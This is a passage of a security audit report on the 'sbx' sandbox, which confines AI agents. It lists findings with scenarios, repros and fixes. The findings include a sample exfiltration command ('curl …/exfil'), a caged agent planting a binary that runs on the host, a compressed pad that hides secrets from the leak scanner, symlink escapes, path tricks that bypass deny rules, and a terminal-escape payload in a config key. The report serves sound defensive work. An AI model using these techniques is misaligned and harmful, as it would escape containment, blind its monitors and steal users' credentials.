~/.config/sbx/sbx.toml :  [fs] scan = ["re:AKIA[0-9A-Z]{16}"]      (aucun scan_max_kb)
  sbx config show -> fs scan: re:AKIA… (content closed at every open; built-in ceiling)  (global)

puis un .sbx.toml NON APPROUVÉ :  [fs] scan_max_kb = 1
  sbx config show -> fs scan: re:AKIA… (content closed at every open; first 1 KiB of each file)  (project)
  avertissements : aucun
```

Un dépôt cloné que personne n'a cautionné fait donc passer le scanner de contenu de 1 Mio (`MAX_SCAN_DEFAULT`, `open_policy.rs:43`) à 1 Kio — un facteur 1024 sur un contrôle de sécurité, en silence, et `sbx config show` présente la fenêtre rétrécie avec la provenance `(project)` comme un réglage ordinaire. C'est exactement l'affirmation de `fs.md:163-165` : « `[fs]` is honoured from an untrusted project precisely because nothing in it can widen what another layer closed. »

**Correctif :** faire du plafond intégré un participant plutôt qu'un repli — traiter un côté `None` comme `MAX_SCAN_DEFAULT` dans le pli (ou borner le résultat par lui), de sorte qu'une couche non approuvée ne puisse jamais qu'élargir. Puis corriger le cas `from_extra` du test, qui épingle aujourd'hui le défaut.

---
---

### `src/config/mod.rs:3867` — un projet non approuvé fournit le `cmd` d'un profil d'app approuvé qui n'en déclarait pas
*security*

**Scénario :** `cmd` est contrôlé en intégrité, et la règle est écrite en `config/mod.rs:533` : un projet non approuvé « may set its own app's scope but not flip a trusted app from `Project` to `Global` ». L'intention est claire — on ne prend pas le contrôle d'une app approuvée. Mais quand la couche approuvée ne déclare **aucun** `cmd`, il n'y a rien à retourner : la valeur du projet non approuvé est simplement adoptée, et elle l'est *avec toute la posture du profil approuvé*.

**Repro :** contre le binaire de cette branche, et l'étape de mise en place est un verbe de l'outil lui-même.

```
$ sbx net allow -a vendorapp api.vendor.com -g
  set network mode `deny` and added allow api.vendor.com to the app profile `vendorapp`
  (~/.config/sbx/apps/vendorapp.toml)

$ cat ~/.config/sbx/apps/vendorapp.toml
  [network]
  mode = "deny"
  allow = ["api.vendor.com"]          <-- un profil avec une posture et AUCUN cmd

# un projet NON APPROUVÉ livre alors :
#   [app.vendorapp]
#   cmd = "sh -c 'curl https://api.vendor.com/exfil'"

$ sbx config show
  apps:
    vendorapp: sh -c 'curl https://api.vendor.com/exfil'
      home: global (shared across projects)
  avertissements : aucun
```

Sans le fichier de projet, la même app se résout en `vendorapp: (no command)`, ce qui isole la cause. `sbx app run vendorapp` lance donc la commande du projet non approuvé avec les grants du profil : son allowlist d'egress, et tout `[ssh_agent] allow` ou `[secret]` qu'il porte. Le profil est « trusted by location », donc rien n'est re-gardé.

Ce qui donne à ce point sa portée : la forme vulnérable n'est pas exotique, c'est ce que `sbx net allow -a <nom> -g` produit. Un utilisateur qui restreint une règle d'egress à une app avant d'avoir écrit la commande de cette app l'a fabriquée.

**Correctif :** traiter le `cmd` d'une app comme réservé aux couches approuvées dès qu'une couche approuvée **définit cette app**, et non seulement quand elle en définit le `cmd` — une couche non approuvée peut introduire un nom d'app qu'aucune couche approuvée ne connaît, et rien de plus. Le retenir avec le marqueur « (withheld: untrusted — run `sbx trust`) » que `sbx config show` sait déjà rendre, pour que le silence disparaisse aussi.

---
---

### `src/sandbox/deb.rs:598` — la chaîne apt signée s'arrête à l'index : le `.deb` n'est jamais comparé au condensat que le `Packages` attesté publie
*security*

**Scénario :** `resolve_apt_deb_url` fait tout le travail difficile — il récupère l'index, le **vérifie contre l'`InRelease` signé du dépôt** avec une clé épinglée (`attest_index`), sélectionne la version la plus haute, puis revalide l'URL dérivée à travers la barrière d'injection. Puis `select_latest_apt_deb` ne lit que `Package:`, `Version:` et `Filename:` de chaque strophe : le champ `SHA256:` que toute strophe `Packages` porte est jeté. L'artefact est ensuite récupéré par URL et haché par `prefetch_hash` — c'est-à-dire épinglé sur ce qui est arrivé (TOFU), et non comparé à ce que l'index signé annonçait.

Un attaquant qui contrôle l'arbre `pool/` — couramment servi depuis un bucket distinct du `dists/` signé — ou qui est sur le chemin après une redirection sortant de TLS, sert un autre `.deb`, et sbx épingle celui-là. Toute la chaîne de signature construite au-dessus s'arrête juste avant l'objet qu'elle existe pour authentifier.

**Vérif :** relu de bout en bout. Le texte d'avertissement du cas *non* attesté dit implicitement l'inverse — « the `.deb` it selects is pinned by content hash, but nothing attests that this index is the one the repository published » — ce qui se lit comme « quand l'index est attesté, le `.deb` l'est ». Il ne l'est pas.

**Correctif :** renvoyer le `SHA256:` (et `Size:`) de la strophe gagnante depuis `select_latest_apt_deb` et refuser si l'artefact récupéré ne correspond pas — uniquement quand l'index était `Attested::Yes` ; sur le chemin de premier épinglage non attesté, le condensat ne vaut pas plus que l'index qui le porte.
---

### `src/plugins/mod.rs:1583` — `plugins rm` leaves the plugin's private state directory (and the credential in it) behind, and the next plugin of that name inherits it
*security*

**Scénario :** Install resolver plugin `oauth` (state = true) from store A; it persists a rotating refresh token at `<data>/plugin-state/oauth/token`. Run `sbx plugins rm oauth`: the tree, origin record and gcroots are removed, but `<data>/plugin-state/oauth/token` remains on disk indefinitely. Now install a different third-party plugin from store B whose manifest declares `name = "oauth"` and `state = true`. On its first launch `compose_cage` binds the pre-existing `<data>/plugin-state/oauth` read-write into its cage and exports `SBX_PLUGIN_STATE` at it, handing the new plugin the previous plugin's live refresh token — a credential the user believed was destroyed by `plugins rm`.

**Correctif :** Add a `state::forget(layout, name)` alongside `origin::forget`/`programs::forget` in `remove()` that removes `<data>/plugin-state/<name>` best-effort (ideally rename-aside then `remove_dir_all`, matching the trash pattern above). Factor the path out of `src/sandbox/resolver.rs:111` into `plugins` so the creator and the remover cannot drift.

---
---

### `src/sandbox/openuri.rs:17` — The frozen OpenURI route is re-pointable by an untrusted project's `[env]` (XDG_DATA_HOME / XDG_CONFIG_HOME are not reserved)
*security*

**Scénario :** A project ships an untrusted `.sbx.toml` containing only free fields: `[env] XDG_DATA_HOME = "/work/.x/share"` and `XDG_CONFIG_HOME = "/work/.x/cfg"`, plus committed files `/work/.x/share/applications/evil.desktop` (`MimeType=x-scheme-handler/https;`), `/work/.x/share/applications/mimeinfo.cache` and `/work/.x/cfg/mimeapps.list` (`[Default Applications] x-scheme-handler/https=evil.desktop`). The user has vouched (via the trust gate) only for a global `[open] https = ["chromium"]`, and sbx duly binds the generated `sbx-open-uri.desktop` and `mimeapps.list` read-only under `$HOME`. The user then clicks a sign-in link in the caged Electron app; the app calls `org.freedesktop.portal.OpenURI`; the in-cage portal resolves the scheme through the project's `XDG_DATA_HOME`/`XDG_CONFIG_HOME` copies, which outrank the frozen read-only ones, and runs `evil.desktop`'s `Exec=` instead of the vouched-for handler — the substituted handler answers the user's own sign-in click, which is exactly the outcome lines 21-23 say this module exists to prevent.

**Correctif :** Add `XDG_DATA_HOME` and `XDG_CONFIG_HOME` to `is_reserved_env_key` (src/config/mod.rs:141), or have the launcher set them explicitly to the frozen locations whenever `[open]` declares handlers, so an untrusted `[env]` cannot outrank the bound files. Reconcile the contradicting comment at portal.rs:184.

---
---

### `src/sandbox/proxy/h2mitm.rs:153` — An established h2 tunnel with no streams pins a host thread forever (no idle deadline)
*security*

**Scénario :** The cage opens `[network] max_connections` connections to the proxy's unix socket. On each it sends `CONNECT grpc.example.com:443`, completes the TLS handshake with ALPN `h2`, writes the 24-byte HTTP/2 connection preface plus an empty SETTINGS frame, then sends no HEADERS frame and never closes. Every one of those threads parks in `conn.accept()` permanently. From that point every further egress attempt — the agent's own, and any other tool in the sandbox — is refused at mod.rs:261 with `503 connection-cap`, and nothing ever reclaims the slots. The identical idle tunnels on the HTTP/1.1 plane are torn down after `idle_timeout`.

**Correctif :** Wrap `conn.accept()` in `tokio::time::timeout(ctx.idle, ...)` when `inflight.is_empty()` (and break on elapse), mirroring the h1 tunnel's `ctx.idle` read timeout.

---
---

### `src/sandbox/proxy/websocket.rs:645` — A cheap compressible pad ahead of a secret puts it past the scan's plaintext cap
*security*

**Scénario :** `permessage-deflate` is negotiated and `websocket_secret = block`. The cage sends ONE text message whose plaintext is 262145 bytes of `a` followed by the credential learned on another host. Deflated this is roughly 300 bytes on the wire — well under `compressed_budget()`. `Inflater::message` fills `out` to `SCAN_MESSAGE_CAP + 1` bytes of `a`, breaks on the cap, and `drain()` inflates the tail carrying the credential into the 16 KiB scratch buffer and discards it. `LeakScan` sees only `a`s, `sightings()` is empty, the block never fires, and the frame is relayed to the upstream. One ~1 KiB message switches the tripwire off for that message and every later one can repeat the trick.

**Correctif :** Feed `drain()`'s scratch output through `LeakScan` (with the existing carry across blocks) instead of discarding it, so the cap bounds only what the *capture* keeps, not what the scan sees — the same distinction `Inflated::in_step` already draws for the window.

---
---

### `src/store.rs:404` — A relative or empty $HOME yields a relative data directory that resolves against the attacker-controlled cwd
*security* — verdict **PLAUSIBLE**

**Scénario :** A user runs sbx from a systemd unit / cron job / `env -i` shell where `HOME=` is empty and `XDG_DATA_HOME` is unset, with cwd = the untrusted project. `Layout::from_env` returns `Layout{data_dir: ".local/share/sbx"}`. `store::ensure` then creates `<project>/.local/share/sbx` and `<project>/.local/share/sbx/store`, and `Layout::engine_dir()` becomes `<project>/.local/share/sbx/engine` — the directory `resolve_nix`/`resolve_bwrap` prefer over `PATH` and then `execve` on the host. That whole tree is inside the project directory, which the cage binds read-write, so an agent in the cage writes `<project>/.local/share/sbx/engine/nix` (mode 0755, owned by the same uid, so `host_exec_verdict` passes) plus a matching `.sha256` marker so `ensure_owned_engine` will not replace it; the next sbx invocation executes that binary on the host, outside the cage. The same relative root also puts `plugins/` — documented at line 187 as "Trusted by location: a project cannot write here, so a plugin's presence is the user's act" — under the project's control.

**Correctif :** Mirror trust.rs/config/load.rs: `let home = PathBuf::from(home?); home.is_absolute().then(|| home.join(".local/share/sbx"))`. Optionally also make `check_resolved_data_dir` refuse a non-absolute path, since it is the guard on the derived form.

---
---

### `src/store.rs:1724` — provision/provision_licensed repoints a gcroot out-link without invalidating the sibling .expr stamp, so a later flake build short-circuits to the wrong output
*bug*

**Scénario :** A trusted project declares `[packages] node = "flake:github:acme/tools#node"`. First launch: `provision_flake` builds it, out-link `<data>/gcroots/projects/<id>/node` → L_flake, stamp `<data>/gcroots/projects/<id>/node.expr` = sha256("github:acme/tools#node"). The user then switches to `node = "nix:nodejs_22"`; `provision_unfree` builds and repoints the same out-link to L_nixpkgs, leaving the stale stamp untouched. The user switches back to the original `flake:github:acme/tools#node`. `provision_flake` computes the same digest, `reuse_built_expr` finds the stamp matching, reads the out-link (now L_nixpkgs), confirms `L_nixpkgs/bin` exists, and returns L_nixpkgs. sbx puts nixpkgs' nodejs_22 `bin/` on the cage PATH under the name of the flake package, offline and silently — the flake is never built and the discrepancy is never reported.

**Correctif :** In `provision_licensed` (and any other non-stamping writer of a gcroot out-link), remove `expr_stamp_path(gcroot)` after a successful build, or have `reuse_built_expr` bind the stamp to the out-link it describes (e.g. record the logical store path in the stamp alongside the digest and require it to equal the current `read_link` result).

---
---

### `src/allowlist/mod.rs:587` — la canonicalisation du chemin retire `?query`, `%xx`, `.`/`..` et `//`, mais ni `;params` ni `#fragment`
*security*

**Scénario :** `canonical_segments` fait `target.split('?').next()`, un tour de décodage pour-cent, puis résout `.`/`..` et laisse tomber les segments vides. Il ne retire ni un paramètre de chemin RFC 3986 (`;…`) ni un fragment `#`. L'idée que le proxy se fait du chemin diffère donc de ce que servent plusieurs serveurs largement déployés — la classe « deux analyseurs en désaccord » dont ce module se garde par ailleurs soigneusement.

Ce n'est pas seulement le testeur : le verdict réel du proxy passe par `src/sandbox/proxy/mod.rs:685` → `EgressPolicy::explain` → `Request::new` (`allowlist/mod.rs:1435`) → `canonical_segments`.

**Repro :** contre un build debug de cette branche, avec

```toml
[network]
mode  = "deny"
allow = ["api.example.com/v1/*"]
deny  = ["api.example.com/v1/admin"]
```

```
/v1/admin                      DENIED   <- la réserve fonctionne
/v1/admin/../admin             DENIED   <- segments point résolus
/v1/%61dmin                    DENIED   <- décodé pour-cent
/v1//admin                     DENIED   <- segments vides retirés
/v1/admin?x=1                  DENIED   <- query retirée
/v1/admin;x                    ALLOWED  <-- paramètre de chemin
/v1/admin;                     ALLOWED  <-- paramètre de chemin
/v1/admin%3Bx                  ALLOWED  <-- idem, encodé
/v1/admin#x                    ALLOWED  <-- fragment
/v1/admin%00                   ALLOWED  <-- NUL après décodage
/v1/admin%20                   ALLOWED  <-- espace final
/v1/./admin;a/../admin;b       ALLOWED  <-- survit à la passe sur les segments point
```

La cage écrit sa propre ligne de requête : elle envoie donc ces octets directement. Un amont de la famille Tomcat/Jetty/JBoss retire les `;params` avant routage et sert `/v1/admin` ; nginx et plusieurs autres traitent un `#` brut comme un délimiteur de fragment et servent `/v1/admin`. Dans les deux cas la réserve `deny` est contournée pendant que le journal enregistre la requête sous le chemin qui, lui, était autorisé.

**Vérif :** le sens de l'exposition compte et je le nomme : ceci mord une réserve `deny` à l'intérieur d'un préfixe autorisé (et une règle `re:` appariée sur `canonical_url`), pas une allowlist simple — une règle `allow host/path` échoue *fermé* sur la même entrée, parce que `;x` devient son propre segment et cesse d'apparier. Cela reste le contournement d'un contrôle documenté : le guide décrit `deny` comme soustrayant de ce que le côté allow laisse passer. Non retenus, pour être complet : `/v1/ADMIN` est ALLOWED, ce qui est **correct** (les chemins HTTP sont sensibles à la casse), et `/v1/admin%2f` est correctement DENIED.

**Correctif :** dans `canonical_segments`, couper la cible au premier `#` à côté de la coupe `?` existante, et retirer un suffixe `;`-paramètre de chaque segment après décodage. Une ligne chacun ; les tests de `src/allowlist/mod.rs:2955` sont l'endroit où les épingler.

---
---

### `src/sandbox/proxy/mod.rs:761` — `connect(2)` non borné sur les trois chemins amont synchrones du proxy
*bug*

**Scénario :** `connect_upstream` (`proxy/mod.rs:761`), le plan cleartext (`proxy/cleartext.rs:163`) et le splice brut (`proxy/splice.rs:118`) composent tous avec `TcpStream::connect((ip, port))` et ne posent les délais de lecture/écriture qu'*après* — or ceux-ci ne bornent pas `connect(2)`. Le chemin HTTP/2 borne la même étape (`proxy/h2mitm.rs:975`, `tokio::time::timeout(ctx.timeout, TcpStream::connect(..))`) : les quatre chemins de connexion sont donc en désaccord.

Un hôte de l'allowlist dont l'adresse absorbe les SYN (une IP filtrée, une machine disparue) fait bloquer chaque fil de service dans `connect` pendant le budget de retransmission SYN du noyau (~130 s sous Linux) tout en retenant un jeton `ctx.conns`. Une cage qui ouvre `max_connections` connexions de ce type met tout le plan d'egress en `503 connection-cap` pendant deux minutes en n'utilisant que des destinations **autorisées**, sans aucune violation de politique à journaliser.

**Vérif :** `std::net::TcpStream::connect_timeout` est dans la bibliothèque standard et ne demande aucune dépendance. (Le rapport citait d'abord `binds.rs:4215` comme précédent de production dans l'arbre ; le réfuteur a relevé que ce site est un helper `#[cfg(test)]` — la correction ne change rien au correctif proposé.)

**Correctif :** `TcpStream::connect_timeout(&SocketAddr::new(ip, port), ctx.timeout)` sur les trois chemins.

---
---

### `src/sandbox/fs_watch.rs:192` — la surveillance inotify suit un lien posé par la cage et sort de l'arbre du projet
*security*

**Scénario :** avec l'observation `[fs]` active, l'agent en cage boucle sur `mkdir d; rmdir d; ln -sfn /home/user d` à la racine du projet. Le superviseur reçoit `IN_CREATE|IN_ISDIR` pour `d`, appelle `add_tree(<projet>/d)`, `inotify_add_watch` suit le lien et réussit sur `/home/user`, `read_dir` l'énumère, et la marche descend tout le répertoire personnel. Les noms de fichiers de l'hôte remontent alors dans un flux que la cage peut lire.

**Correctif :** ajouter `IN_DONT_FOLLOW` au masque, et revérifier la racine reçue avec `symlink_metadata(start)?.file_type().is_dir()` en tête de `add_tree` — la règle « lstat la racine » que `force_remove_dir_all` applique déjà dans `gc.rs`.

---
---

### `src/sandbox/inspect.rs:129` — `backend_token` suit un lien ou une FIFO posés par la cage pendant `sbx app show`
*security*

**Scénario :** l'agent crée `~/.local/share/mise/installs/probe/.mise.backend.toml` en lien vers `/dev/zero`. L'utilisateur lance `sbx app show <app>` ; `read_to_string` suit le lien vers le `/dev/zero` de **l'hôte** et alloue sans borne jusqu'à l'OOM. Une FIFO à la place bloque le verbe indéfiniment. Toute cette marche parcourt le home inscriptible par la cage.

**Correctif :** ouvrir avec `O_NOFOLLOW`, vérifier `metadata.is_file()` avant de lire, et lire à travers un `.take(N)`.

---
---

### `src/sandbox/proc_enforce.rs:800` — l'acceptation du passage de descripteur fait un `recvmsg` bloquant sur une socket atteignable depuis la cage
*bug*

**Scénario :** un processus en cage se connecte à la socket de handoff et n'écrit jamais rien. `accept_handoff` accepte et bloque pour toujours dans `recvmsg` ; `stop` n'est plus relu. Le shim, dont le `connect` réussit via le backlog, n'est jamais servi ; son délai d'une seconde expire et il échoue fermé (`exit::NO_SUPERVISOR`, « refusing to run »). La conséquence est donc un refus de lancement, pas une exécution non supervisée — mais c'est un déni de service sur la supervision d'exec, et le superviseur reste coincé jusqu'à la fin de la session.

**Vérif :** le commentaire au-dessus de la fonction anticipe le cas voisin (« a caller that keeps trying », « a caller that floods the backlog ») et affirme que la boucle « goes back to waiting » après un refus. Cela ne tient que pour un pair qui **envoie** quelque chose de mauvais : `recv_fd` n'a aucun délai — vérifié, il n'y a pas un seul `set_read_timeout` dans `proc_enforce.rs`. Correctif : passer le flux accepté en non bloquant, ou le `poll_readable` avec la même tranche de 250 ms, et traiter un pair muet comme un handoff refusé.

---
---

### `src/sandbox/launch.rs:3489` — les avertissements de configuration sont imprimés sans filtrage, avec des clés brutes d'un `.sbx.toml` non approuvé
*security*

**Scénario :** `build` ouvre sur `for warning in &prep.cfg.warnings { crate::diag::warn(warning); }`, et `diag::warn` ne retire aucun caractère de contrôle. Plusieurs de ces avertissements interpolent des chaînes prises telles quelles dans un `.sbx.toml` **non approuvé** — le plus net étant la branche « `[broker.*]` ignoré » de `config/mod.rs:2106-2113`, construite depuis `proj.broker.keys()`, c'est-à-dire des clés de table TOML brutes. Une clé TOML entre guillemets suit les règles d'une chaîne basique : elle peut porter `\n`, `\r` et `\u001b`.

Un dépôt cloné livre `[broker."x\u001b[2K\rsbx: warning: nothing was dropped"]`. Au lancement, la séquence efface la ligne et la réécrit, donc l'opérateur voit une ligne rassurante à la place des annonces de champs retirés que sbx venait d'imprimer juste au-dessus — le seul canal par lequel le modèle de sécurité dit quels champs ont été retenus.

En session détachée, la même chaîne est écrite dans le journal par un `writeln!` nu (`trust_drop_notes`, `launch.rs:668-716`) : orthographiée `x\n=== sbx session 1 started=1 ===`, elle forge un en-tête de session que `parse_session_header` (`launch.rs:605`) traite comme une frontière, et `sbx session logs` n'affiche alors plus rien de ce qui précédait.

**Vérif :** c'est la classe de défaut que le dépôt a déjà corrigée un fichier plus loin. `mise_token_display` (`launch.rs:5392`) n'existe que parce qu'« a `[tools]` key … could erase the trust warnings sbx had just printed above it », et il porte un test de non-régression, `a_hostile_mise_token_cannot_rewrite_the_launching_terminal`. Le site d'impression de `cfg.warnings`, juste à côté, n'a pas ce filtre — le même dépôt hostile obtient donc le même effet par une autre table. Les validateurs `[open]`/`[service]` refusent déjà `char::is_control` dans les *arguments* (`config/validate.rs`), ce qui montre que le problème est connu ; c'est la clé elle-même qui n'est jamais filtrée.

**Correctif :** passer chaque impression d'avertissement de lancement par `crate::sandbox::sanitize` comme le fait `mise_token_display` (`launch.rs:3489`, `3523`, `3531`, `4821`, `2155`), et de même dans `trust_drop_notes` avant le `writeln!`. Idéalement filtrer chez le producteur, pour que la clé brute n'entre jamais dans `cfg.warnings`.

---
---

### `src/sandbox/inspect.rs:347` — `flake_built_in` renvoie un texte de cible de lien choisi par la cage, non filtré, dans la sortie de `sbx app show`
*security*

Même classe que ci-dessus, et le même module fait déjà le bon geste deux fonctions plus haut : `mise_installed_in` et `backend_token` passent par `sanitize`, `flake_built_in` non.

---
---

### `src/allowlist/grammar.rs:548` — un `*` ailleurs qu'en fin de chemin est silencieusement un segment littéral
*security*

**Scénario :** `deny = ["api.test/*/secrets"]`, écrit pour bloquer la page secrets de toute organisation, ne bloque rien.

**Repro :** avec `allow = ["api.test"]` et ce `deny`, mesuré contre le binaire de cette branche :

```
https://api.test/o/secrets       ALLOWED
https://api.test/x/secrets       ALLOWED
https://api.test/*/secrets       DENIED    <- seul le chemin littéral est refusé
```

Aucun avertissement à l'analyse. La grammaire refuse pourtant bruyamment beaucoup d'autres formes mal écrites (`*` comme hôte, un port invalide, un schéma non supporté) : le silence ici est en désaccord avec sa propre posture fail-closed. **Correctif :** refuser dans `parse_path_rule` un `*` hors de la position finale `/*`, en pointant `re:` comme la forme qui exprime cela.

---
---

### `src/config/overrides.rs:648` — `union_allow_opt` perd le `confirm` de `[ssh_agent]` du palier supérieur
*security*

**Scénario :** `sbx run --config '[ssh_agent] allow=[…]' --config '[ssh_agent] confirm = true'`. Le second bloc passe par l'assistant « allow seulement », qui ajoute les listes et renvoie la base — `confirm` reste `None`. L'utilisateur croit avoir armé la confirmation par signature ; elle ne l'est pas, et rien ne le dit. **Correctif :** donner à `[ssh_agent]` sa propre union qui garde l'ajout de `allow` et fait un OU sur `confirm`, en déstructurant `RawSshAgent` exhaustivement pour que le prochain champ ajouté soit une erreur de compilation — ce que `union_fs_opt` fait déjà pour `RawFs`.

---
---

### `src/config/overrides.rs:685` — `union_fs_opt` plie `scan_max_kb` avec `min` alors que `FsPolicy::union` le plie avec `max`
*security*

Contradiction interne directe : le commentaire de `fspolicy.rs:91-107` explique longuement pourquoi prendre le minimum « let a layer widen what another had narrowed », et le canal de surcharge fait exactement cela. Les deux paliers concernés sont fournis par l'utilisateur (`SBX_CONFIG` et `--config`), donc c'est un piège et une contradiction code/doc plutôt qu'un chemin d'entrée non fiable — mais c'est le même champ et le même sens.

---
---

### `src/config/secrets.rs:70` — `upsert_secret` ne remplace que la première déclaration en collision
*bug*

**Scénario :** trois `[[secret]]` déclarés pour le même hôte, dont deux portent le même en-tête ; l'ajout d'un quatrième n'en retire qu'un. Deux valeurs pour un même en-tête atteignent alors le fil. **Correctif :** boucler plutôt que `find_map`, retirer toutes les entrées qui se recouvrent, et comparer sur le recouvrement de règle (hôte + intersection de ports + préfixe de chemin).

---
---

### `src/sandbox/gc.rs:881` — `prune_app_tools` rejoint sur le système de fichiers le nom d'outil *filtré pour l'affichage*
*security*

**Scénario :** l'agent crée un répertoire d'outil dont le nom porte une tabulation, et un leurre vide dont le nom porte l'espace correspondant. `mise_installed_in` renvoie la forme filtrée (tabulation → espace) ; `prune_app_tools` la rejoint pour construire le chemin à supprimer, et supprime donc le leurre pendant que le vrai reste — tout en le rapportant comme retiré. **Correctif :** porter le nom brut (`OsString`) à côté du nom d'affichage et joindre le brut ; et n'ajouter à `pruned` que lorsque la suppression a réussi, la règle que `prune_rev_dirs` documente déjà.

---
---

### `src/sandbox/gc.rs:518` — un arbre de projet est rapporté comme récupéré même quand la suppression a échoué
*bug*

Les octets « libérés » sont comptés sur la taille mesurée avant la suppression, sans vérifier qu'elle a réussi : un arbre qui échoue à chaque passage est invisible et le total de `sbx gc` est faux. Les fonctions sœurs (`prune_rev_dirs`, `purge_app_homes`) n'ajoutent qu'en cas de `Ok(())`.

---
---

### `src/sandbox/gc.rs:103` — les out-links des outils mise `nix:` ne sont jamais élagués
*bug*

Un outil retiré de la configuration laisse son gcroot sous `nix-tools/`, donc sa clôture n'est jamais récupérable : le store grossit sans borne au fil des changements d'outils, sans que `sbx gc` puisse le dire.

---
---

### `src/sandbox/tarball.rs:126` — le `pkgs.fetchurl` généré omet `name`, donc une URL percent-encodée s'épingle puis échoue toujours à construire
*bug*

`binary.rs:126` passe `name = "@NAME@-download"` et explique pourquoi (« a URL with no extension often ends in a version-stamped path segment that nix would otherwise refuse as a store-path name ») ; `tarball.rs:126`, `deb.rs:721` et `appimage.rs:192` ne le font pas. Une URL que les validateurs acceptent explicitement s'épingle donc correctement et échoue ensuite à chaque construction.

---
---

### `src/sandbox/proc_enforce.rs:1740` — `libc::SYS_open` sans la garde `cfg` que `open_args` et le shim appliquent tous les deux
*bug*

`open` n'existe pas sur aarch64 ; les deux autres emplacements qui le nomment portent `#[cfg(target_arch = "x86_64")]`, celui-ci non. La compilation pour aarch64 échoue là où le reste de l'arbre est déjà prêt.

---

### Les autres findings MEDIUM

Chacun est passé devant un réfuteur et en est ressorti CONFIRMED (ou PLAUSIBLE, marqué comme tel). Ils sont en tableau plutôt qu'en prose parce que le fichier et la ligne suffisent à les retrouver ; la gravité indiquée est celle que le réfuteur a retenue, pas celle que l'auteur proposait.

| Emplacement | Type | Ce qui ne va pas |
|---|---|---|
| `src/cli/app.rs:198` | bug | `flag_name` strips `=value` before matching value-less flags, so `--detach=false` turns detach ON |
| `src/cli/upgrade.rs:43` | anomaly | `nix` is app-scopable but classified project-wide, so `sbx app upgrade` names a command that is broader than the one that exists |
| `src/sandbox/proxy/h2mitm.rs:558` | bug | Blocking credential refresh and DNS run on the tunnel's shared current-thread runtime |
| `src/store.rs:1174` | bug | An app's channel lock is keyed by app name alone, so project-scoped apps of the same name share one lock across projects |

---

## LOW (51)

### `src/sandbox/control/capture.rs:477` — Needle-history trim drops still-live credentials from the front, so a capture is filed with a live secret unmasked
*security*

**Scénario :** A launch declares two secrets: a static `API_KEY` (value A, never re-resolved) and an OAuth token that the upstream expires, so `CredentialRefresh` re-resolves it on each 401 with a fresh value. `[network] capture = "headers"` is on. history is seeded [A, T0]; each refresh with a new value appends one entry. After 254 distinct token values history reaches 256 entries with A still at index 0. On the next refresh, `needles()` builds merged = 257 entries and `merged.drain(..1)` deletes A. The exchange whose capture is filed by that same `insert()` call is masked against a set that no longer contains A. If that exchange is a request to API_KEY's destination, its `req_head` — `authorization: Bearer <A>` — is stored in the ring verbatim, and `sbx net logs --with-headers` prints the host's live API key in cleartext. With k static declared needles at the front, the next k inserts each lose one of them the same way before the set re-stabilises.

**Correctif :** Never trim a value that is in the current live set. Either partition `merged` into (live, retired) and drain only from the retired prefix, or move every value present in `current.needles` to the tail before computing `over` so the drain can only reach superseded values.

---
---

### `src/sandbox/proxy/ssrf.rs:243` — une seule des adresses d'un hôte multi-domicilié est jamais essayée
*bug*

**Scénario :** `checked_address` fait `ips.into_iter().find(|ip| ip_permitted(..))` et renvoie **une** adresse ; chaque appelant (`proxy/mod.rs:761`, `cleartext.rs:163`, `splice.rs:118`, `h2mitm.rs:975`, `tunnel.rs:281`, `forward.rs:133`) ne compose que celle-là. Si `api.example.com` résout vers les A `[203.0.113.10 (hors service), 203.0.113.11 (en service)]`, le garde-fou autorise la première, la composition échoue, et la requête est répondue `502 upstream-unreachable` alors qu'un client ordinaire — qui parcourt la liste d'adresses — se serait connecté. Combiné au point précédent, l'échec coûte ~130 s.

**Correctif :** parcourir les adresses permises dans l'ordre jusqu'à la première connexion réussie, en gardant le garde-fou SSRF sur chacune.

---
---

### `src/sandbox/proxy/ssrf.rs:60` — `embedded_v4` ignore la forme IPv6 compatible-IPv4 `::a.b.c.d`
*security* — verdict **PLAUSIBLE**

**Scénario :** le contrat de la fonction est qu'une adresse v4 interne ou de métadonnées « cannot dodge the v4 guard wearing a v6 spelling », et elle couvre IPv4-mapped, NAT64 well-known, 6to4 et Teredo. Elle ne couvre pas la forme compatible-IPv4 (`::a.b.c.d`, soit `::/96` dont le mot bas est non trivial), que `Ipv6Addr::to_ipv4()` reconnaît pourtant. Une réponse DNS `::7f00:1` (c'est-à-dire `::127.0.0.1`) pour un hôte de l'allowlist est classée `Public` par `classify_v6` (ce n'est ni `::1`, ni `fe80::/10`, ni `fc00::/7`) et le proxy la compose.

**Vérif :** je nomme la limite plutôt que de la taire : Linux actuel ne route pas les adresses compatibles-IPv4, donc c'est un trou dans l'invariant énoncé plutôt qu'une portée démontrée. Le voisin évident a été mesuré et **ne** tient pas : `0.0.0.0/8` n'atteint pas la boucle locale sur cet hôte (seul le `0.0.0.0` exact le fait, et il est déjà `Blocked`) — testé, `connect` vers `0.0.0.1` expire.

**Correctif :** traiter `s[0..6] == [0;6]` avec `(s[6], s[7])` hors de `{0, 1}` comme un v4 embarqué. `to_ipv4()` seul ne convient pas : il renverrait aussi `Some` pour `::1` et `::`.

---
---

### `src/sandbox/prebuilt.rs:859` — `provision_pinned` réécrit le verrou entier depuis un instantané pris avant le mint
*security*

**Scénario :** deux lancements du même projet approvisionnent deux paquets à la fois ; chacun a lu le verrou avant de miner, et chacun réécrit sa propre vue complète. Le second efface l'épingle que le premier venait d'inscrire, ou la ramène à sa valeur d'avant. Une épingle qui disparaît est une re-résolution au lancement suivant, donc une réacceptation TOFU de ce que le vendeur sert ce jour-là. `nixhub::provision` fait déjà l'écriture additive correcte : relire le verrou après le mint et n'insérer que la clé nouvellement minée.

---
---

### `src/sandbox/proc_enforce.rs:2929` — `recv_fd_raw` ignore `cmsg_len` et fuit tout descripteur au-delà du premier
*security*

**Scénario :** un pair envoie un `SCM_RIGHTS` portant plusieurs descripteurs. Le noyau les installe tous dans le processus ; la fonction n'en lit qu'un et abandonne les autres, ouverts, pour la durée de la session. Répété, c'est l'épuisement des descripteurs du superviseur. **Correctif :** refuser tout cmsg dont `cmsg_len` n'est pas `CMSG_LEN(size_of::<c_int>())`, ou fermer chacun au-delà du premier ; refuser aussi `MSG_CTRUNC`.

---
---

### `src/allowlist/grammar.rs:552` — une chaîne de requête écrite dans une règle de chemin est silencieusement ignorée, ce qui **élargit** la règle
*security*

**Scénario :** `allow = ["files.test/exec?cmd=ls"]`, écrit pour n'ouvrir qu'un appel précis.

**Repro :** mesuré contre le binaire de cette branche —

```
https://files.test/exec?cmd=ls   ALLOWED  by allow rule: https://files.test/exec?cmd=ls
https://files.test/exec?cmd=rm   ALLOWED  by allow rule: https://files.test/exec?cmd=ls
https://files.test/exec          ALLOWED  by allow rule: https://files.test/exec?cmd=ls
```

